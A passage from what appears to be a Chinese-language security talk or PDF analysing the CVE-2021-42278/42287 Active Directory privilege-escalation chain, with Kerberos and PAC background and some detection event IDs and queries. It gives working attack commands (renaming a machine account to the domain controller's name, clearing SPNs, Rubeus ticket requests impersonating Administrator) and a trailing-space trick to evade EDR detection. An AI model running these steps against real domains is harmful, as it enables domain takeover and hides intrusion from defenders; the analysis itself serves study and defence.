但是这个漏洞就是修改了samAccountName的值，所以我们想要⼀个修改的⽅法,通过查看资料，我们
可以通过删除SPN的值来绕过。 
列出当前域的SPN值 
Set-MachineAccountAttribute -MachineAccount "SPN-ATT1" -Attribute SamAccountName -
Value "WIN-Q3T6AV1HB0V1"
修改 samAccountName、DnsHostname 或 msDS-AdditionalDnsHostName 属性，SPN 列表将⾃
动更新为新值。
服务主体名称（SPN）是Kerberos客户端⽤于唯⼀标识给特定Kerberos⽬标计算机的服务实例名称。
Kerberos身份验证使⽤SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个
服务实例，则每个实例都必须具有⾃⼰的SPN。如果客户端可能使⽤多个名称进⾏身份验证，则给定
的服务实例可以具有多个SPN。例如，SPN总是包含运⾏服务实例的主机名称，所以服务实例可以为
其主机的每个名称或别名注册⼀个SPN。
setspn -T qax.com -Q */*
9
我们新建的机器账号是存在SPN的⼀些值的 
可以使⽤PowerView的Set-DomainObject和addspn.py来进⾏删除。 
CN=DESKTOP-RLRTCPJ,CN=Computers,DC=qax,DC=com
        RestrictedKrbHost/DESKTOP-RLRTCPJ
        HOST/DESKTOP-RLRTCPJ
        RestrictedKrbHost/DESKTOP-RLRTCPJ.qax.com
        HOST/DESKTOP-RLRTCPJ.qax.com
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py
10
清理spn之后可以看到 
然后就可以设置SamAccountName的值 
Set-MachineAccountAttribute -MachineName WIN-Q3T6AV1HB0V -Attribute SamAccountName -
Value WIN-Q3T6AV1HB0V
11
 在DC我们可以看到 
同时我们也可以修改 DnsHostname和msDS-AdditionalDnsHostName的值 
基本上CVE-2021-42278就利⽤完成了。 
 Set-MachineAccountAttribute -MachineAccount "SPN-ATT" -Attribute DnsHostname -Value 
"WIN-Q3T6AV1HB0V.qax.com" -Verbose
 Set-MachineAccountAttribute -MachineAccount "SPN-ATT" -Attribute msDS-
AdditionalDnsHostName -Value "WIN-Q3T6AV1HB0V.qax.com" -Verbose
12
Object 类和 UserAccountControl 验证失败时，系统⽇志中将记录事件：16990 
SAM 帐户名称验证失败事件16991 
计算机帐户成功创建审核事件 
使⽤powershell查找没有"$"的sAMAccountName 的计算机帐户： 
要查找具有不合规UserAccountControl sAMAccountType 的计算机帐户： 
⼿法是利⽤ MAQ （MachineAccountQuota）的允许⾮特权⽤户将机器帐户对象添加到域中，默认情
况下，⼀个⾮特权⽤户可以创建 10 个机器帐户把机器帐户账号添加到域中，然后删除这个机器账号的
SPN值，通过修改sAMAccountName值来模拟域控制器。 
其实如果我们没有办法清除SPN的值(可能打了补丁或权限问题)我们也可以修改samAccountName的值
使⽤空格清除"$"的来伪造我们在域内的流量，欺骗蓝队和安全设备(EDR..)等等的检测。 
例如： 
然后 
检测 
4741 (S)：创建了⼀个计算机帐户
4742 (S)：计算机帐户已更改
4743（S）：⼀个电脑账户被删除
Get-ADComputer -LDAPFilter "(samAccountName=*)" |? SamAccountName -NotLike "*$" | 
select DNSHostName, Name, SamAccountName
Get-ADComputer -LDAPFilter "UserAccountControl:1.2.840.113556.1.4.803:=512"
总结 
拓展 
Set-MachineAccountAttribute -MachineAccount "SPN-ATT1" -Attribute SamAccountName -
Value "WIN-Q3T6AV1HB0V" -Verbose
13
在DC上看： 
同理我们可以模仿administrator 
在流量上我们就可以看到 
Set-MachineAccountAttribute -MachineAccount "SPN-ATT1" -Attribute SamAccountName -
Value "WIN-Q3T6AV1HB0V " -Verbose(注意空格)
 Set-MachineAccountAttribute -MachineAccount "SPN-ATT1" -Attribute SamAccountName -
Value "administrator " -Verbose注意空格
14
当然还有更好玩的⼿法，这⾥不再讨论。 
CVE-2021-42287解决了影响 Kerberos 特权属性证书 (PAC) 并允许潜在攻击者冒充域控制器的安全
绕过漏洞。受感染的域帐户可能会导致密钥分发中⼼ (KDC) 创建具有⽐受感染帐户更⾼权限级别的服务
票证。 
CVE-2021-42287 中改进的身份验证过程向 Kerberos 票证授予票证 (TGT) 的 PAC 添加了有关原始
请求者的新信息。当为帐户⽣成 Kerberos 服务票证时，新的身份验证过程将验证请求 TGT 的帐户是
否与服务票证中引⽤的帐户相同。 
AS（Authentication Server）= 认证服务器 
KDC（Key Distribution Center）= 密钥分发中⼼ 
TGT（Ticket Granting Ticket）= 票据授权票据，票据的票据 
TGS（Ticket Granting Server）= 票据授权服务器 
SS（Service Server）= 特定服务提供端 
CVE-2021-42287 - KDC bamboozling 
Kerberos简单概念 
●
●
●
●
●
15
客户端⽤户发送⾃⼰的⽤户名到KDC服务器以向AS服务进⾏认证。 
KDC服务器会⽣成相应的TGT票据，打上时间戳，在本地数据库中查找该⽤户的密码，并⽤该密码对
TGT进⾏加密，将结果发还给客户端⽤户。该操作仅在⽤户登录或者kinit申请的时候进⾏。  
客户端收到该信息，并使⽤⾃⼰的密码进⾏解密之后，就能得到TGT票据了。 
这个TGT会在⼀段时间之后失效，也有⼀些程序(session manager)能在⽤户登陆期间进⾏⾃动更新。 
当客户端⽤户需要使⽤⼀些特定服务(Kerberos术语中⽤"principal"表示)的时候，该客户端就发送TGT
到KDC服务器中的TGS服务。当该⽤户的TGT验证通过并且其有权访问所申请的服务时，TGS服务会⽣
成⼀个该服务所对应的ticket和session key，并发还给客户端。客户端将服务请求与该ticket⼀并发送
给相应的服务端即可。 
特权属性证书 (PAC) 是 Kerberos 票证的扩展，其中包含有关⽤户特权的有⽤信息。当⽤户在 Active 
Directory 域中进⾏身份验证时，域控制器会将这些信息添加到 Kerberos 票证中。当⽤户使⽤他们的 
Kerberos 票证对其他系统进⾏身份验证时，可以读取 PAC 并使⽤它来确定他们的权限级别，⽽⽆需联
系域控制器来查询该信息. 
解决的是 “What can I do?”的问题： 
⽤户向KDC发起AS_REQ,请求凭据是⽤户hash加密的时间戳，KDC使⽤⽤户hash进⾏解密，如果结果
正确返回⽤krbtgt hash加密的TGT票据，TGT⾥⾯包含PAC,PAC包含⽤户的sid，⽤户所在的组。 
然后使⽤TGT去申请TGS，任何⼀个⽤户，只要hash正确，可以请求域内任何⼀个服务的TGS票据，⽤
户拿着TGS票据去请求服务，服务使⽤⾃⼰的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那
边询问⽤户有没有访问权限，域控解密PAC。获取⽤户的sid，以及所在的组，再判断⽤户是否有访问服
务的权限，PAC对于⽤户和服务全程都是不可⻅的。只有KDC能制作和查看PAC。 
https://zh.wikipedia.org/wiki/Kerberos
PAC特权属性证书 
https://www.anquanke.com/post/id/192810
16
那么我们可以整理知道 
客户端(Client)从认证服务器(AS)获取票据的票据(TGT)时: 
Client向AS发送1条明⽂消息，申请基于⽤户想要访问的服务，然后AS检查该⽤户ID是否在于本地数据
库中，如果⽤户存在则返回2条消息： 
那么我们现在需要⼀个TGT，使⽤CVE-2021-42278中创建的机器账号来申请⼀个TGT。 
同样我们也可以申请别的TGT 
分析 
通过⽤户密钥(user's secret key)进⾏加密的Client/TGS会话密钥(Client/TGS Session Key)
通过TGS密钥(TGS's secret key)进⾏加密的票据授权票据(TGT)
 .\Rubeus.exe asktgt /user:"WIN-Q3T6AV1HB0V" /password:"123" /domain:"qax.com" 
/dc:"WIN-Q3T6AV1HB0V.qax.com" /nowrap
17
这⾥我们请求到的是我们创建的机器的普通 TGT，但使⽤的是新的 samaccontname。 
然后给我们返回使⽤⽤户密钥(user's secret key)对Client/TGS会话密钥(Client/TGS Session Key)进
⾏加密和通过TGS密钥(TGS's secret key)进⾏加密的票据授权票据(TGT)。 
然后到使⽤我们TGT去申请TGS：即是服务授权（client从TGS获取票据(client-to-server ticket)） 
这⾥我们需要使TGS没有办法找到我们需要的服务，，因为收到client后，TGS⾸先检查KDC数据库中
是否存在所需的服务，如果没有这些服务，那么TGS会重新搜索带有尾随的$的机器账号，然后查找是
否存在client中需要的服务。 
⼀旦Client收到返回的消息，Client⾸先尝试⽤⾃⼰的“⽤户密钥”(user's secret key)解密Client/TGS
会话密钥(Client/TGS Session Key)，如果⽤户输⼊的密码与AS数据库中的密码不符，则不能成功解
密。
输⼊正确的密码并通过随之⽣成的"user's secret key"才能解密，从⽽得到“Client/TGS会话密
钥”(Client/TGS Session Key)。（注意：Client不能解密TGT，因为B是⽤TGS密钥(TGS's secret 
key)加密的）。拥有了“Client/TGS会话密钥”(Client/TGS Session Key)，Client就⾜以通过TGS进
⾏认证了。
这⾥会发送以下内容
消息1：即消息B的内容（TGS's secret key加密后的TGT），和想获取的服务的服务ID（注意：不是
⽤户ID）
消息2：认证符(Authenticator)（Authenticator包括：⽤户ID，时间戳），通过Client/TGS会话密钥
(Client/TGS Session Key)进⾏加密
18
那么我们可以把我们创建的机器账号的 samaccontname修改回来或别的内容。 
在DC上： 
那么TGS会重新搜索带有尾随的$的机器账号，因为我们请求的服务为：WIN-Q3T6AV1HB0V，TGS加
上"$"就变成了"WIN-Q3T6AV1HB0V$"即是DC。 
然后TGS⽤⾃⼰的“TGS密钥”(TGS's secret key)解密TGT，从⽽得到之前⽣成的“Client/TGS会话密
钥”(Client/TGS Session Key)。 
TGS再⽤这个Session Key解密消息2得到包含⽤户ID和时间戳的Authenticator，并对TGT和
Authenticator进⾏验证，验证通过之后返回2条消息： 
 Set-MachineAccountAttribute -MachineAccount "SPN-ATT" -Attribute SamAccountName -
Value "WIN-Q3T6AV1HB0V1" -Verbose
消息3：client-server票据(client-to-server ticket)（该ticket包括：Client/SS会话密钥 
(Client/Server Session Key），⽤户ID，⽤户⽹址，有效期），通过提供该服务的服务器密钥
19
那么按照Kerberos的流程: 
TGS使⽤DC的服务器密钥(service's secret key)进⾏client-server票据(client-to-server ticket)加密
并返回给我们。TGS错误地给我们颁发了DC的client-server票据(client-to-server ticket)。所以我们
拿到了使⽤ DC 密钥加密的 ST。 
我们需要使⽤S4U2self申请⼀个服务票据(ST)并注⼊内存中，S4U2self扩展允许服务获得服务票据本身
就代表⽤户。 
(service's secret key)进⾏加密
消息4：Client/SS会话密钥( Client/Server Session Key)（该Session Key⽤在将来Client与Server 
Service的通信（会话）上），通过Client/TGS会话密钥(Client/TGS Session Key)进⾏加密
.\Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:WIN-Q3T6AV1HB0V.qax.com 
/self /altservice:LDAP/WIN-Q3T6AV1HB0V.qax.com /ptt /ticket:
服务请求（client从SS获取服务）：
当获得“Client/SS会话密钥”(Client/Server Session Key)之后，Client就能够使⽤服务器提供的服务
了。Client向指定服务器SS发出2条消息：
消息e：即上⼀步中的消息E“client-server票据”(client-to-server ticket)，通过服务器密钥
(service's secret key)进⾏加密
消息g：新的Authenticator（包括：⽤户ID，时间戳），通过Client/SS会话密钥(Client/Server 
Session Key)进⾏加密
SS⽤⾃⼰的密钥(service's secret key)解密消息e从⽽得到TGS提供的Client/SS会话密钥
(Client/Server Session Key)。再⽤这个会话密钥解密消息g得到Authenticator，（同TGS⼀样）对
Ticket和Authenticator进⾏验证，验证通过则返回1条消息（可以提⾼服务）
20
但是如果我们直接请求直接根据TGT请求TGS依然是我们创建的TGS. 
如果是 S4USelf得到的TGS，其PAC是重新构造的，⽽直接请求得到的TGS是直接复制的，下⾯是分析